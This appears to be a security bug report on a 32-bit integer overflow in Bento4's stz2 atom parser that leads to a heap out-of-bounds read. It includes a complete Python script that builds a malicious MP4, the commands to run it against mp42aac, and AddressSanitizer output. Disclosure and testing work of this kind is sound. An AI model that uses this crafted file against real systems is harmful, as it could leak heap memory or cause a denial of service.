## Bug0: AP4_Stz2Atom 32-bit integer overflow bypasses size check leading to heap out-of-bounds read

In `AP4_Stz2Atom::AP4_Stz2Atom()` in `Ap4Stz2Atom.cpp`, the 32-bit multiplication `sample_count * m_FieldSize` wraps to zero when `sample_count` is `0x20000000` and `field_size` is `8`, the corrupted zero-valued `table_size` causes the subsequent bounds check `(table_size+8) > size` to pass unconditionally, a zero-byte heap buffer is allocated, and the for loop then iterates `0x20000000` times reading from that zero-byte allocation to produce heap out-of-bounds reads.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(fourcc, payload):
    size = 8 + len(payload)
    return struct.pack(">I", size) + fourcc + payload

def fullbox(fourcc, version, flags, payload):
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(fourcc, fb_payload)

def build_ftyp():
    payload = b"isom" + struct.pack(">I", 0) + b"isom"
    return box(b"ftyp", payload)

def build_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 10
    payload += b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload += b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00"
    payload += b"\x00" * 24
    payload += struct.pack(">I", 2)
    return fullbox(b"mvhd", 0, 0, payload)

def build_tkhd():
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
    payload += b"\x00" * 8
    payload += struct.pack(">HHH", 0, 0, 0)
    payload += b"\x00" * 2
    payload += b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    payload += b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00"
    payload += struct.pack(">II", 0, 0)
    return fullbox(b"tkhd", 0, 3, payload)

def build_mdhd():
    payload = struct.pack(">IIII", 0, 0, 44100, 0)
    payload += struct.pack(">HH", 0x55C4, 0)
    return fullbox(b"mdhd", 0, 0, payload)

def build_hdlr():
    payload = struct.pack(">I", 0)
    payload += b"soun"
    payload += b"\x00" * 12
    payload += b"\x00"
    return fullbox(b"hdlr", 0, 0, payload)

def build_smhd():
    payload = struct.pack(">HH", 0, 0)
    return fullbox(b"smhd", 0, 0, payload)

def build_dref():
    url_payload = struct.pack(">I", 1)
    url_entry = fullbox(b"url ", 0, 1, b"")
    url_payload += url_entry
    return fullbox(b"dref", 0, 0, url_payload)

def build_dinf():
    return box(b"dinf", build_dref())

def build_stsd():
    payload = struct.pack(">I", 0)
    return fullbox(b"stsd", 0, 0, payload)

def build_stts():
    payload = struct.pack(">I", 0)
    return fullbox(b"stts", 0, 0, payload)

def build_stz2():
    # field_size=8, sample_count=0x20000000:
    # 32-bit: 0x20000000 * 8 = 0x100000000 overflows to 0 -> table_size = 0
    # size check (0+8) > 21 is false -> bypassed
    # allocates 0-byte buffer, loop iterates 0x20000000 times -> OOB read
    FIELD_SIZE = 8
    SAMPLE_COUNT = 0x20000000
    payload = struct.pack(">I", 0)              # reserved (4 bytes)
    payload += struct.pack(">B", FIELD_SIZE)    # field_size = 8
    payload += struct.pack(">I", SAMPLE_COUNT)  # sample_count = 0x20000000
    return fullbox(b"stz2", 0, 0, payload)

def build_stsc():
    payload = struct.pack(">I", 0)
    return fullbox(b"stsc", 0, 0, payload)

def build_stco():
    payload = struct.pack(">I", 0)
    return fullbox(b"stco", 0, 0, payload)

def build_stbl():
    content = (build_stsd() + build_stts() + build_stz2() +
               build_stsc() + build_stco())
    return box(b"stbl", content)

def build_minf():
    return box(b"minf", build_smhd() + build_dinf() + build_stbl())

def build_mdia():
    return box(b"mdia", build_mdhd() + build_hdlr() + build_minf())

def build_trak():
    return box(b"trak", build_tkhd() + build_mdia())

def build_moov():
    return box(b"moov", build_mvhd() + build_trak())

data = build_ftyp() + build_moov()
with open("poc_input.mp4", "wb") as f:
    f.write(data)
print(f"[+] Written {len(data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55f931838094 bp 0x7ffe6957b770 sp 0x7ffe6957b760
READ of size 1 at 0x5020000000f1 thread T0
    #0 0x55f931838093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x55f931839087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file to any mp42aac invocation can trigger a heap out-of-bounds read caused by the `AP4_Stz2Atom` integer overflow corrupting the stream position and causing downstream atom parsing to read past the end of a one-byte heap allocation. The OOB read occurs over a span controlled by the attacker-supplied `sample_count` field, enabling potential disclosure of heap memory contents from adjacent allocations or heap metadata. On systems with limited memory the `SetItemCount(0x20000000)` call that precedes the loop may exhaust available memory and cause a denial of service even before the OOB read is reached.
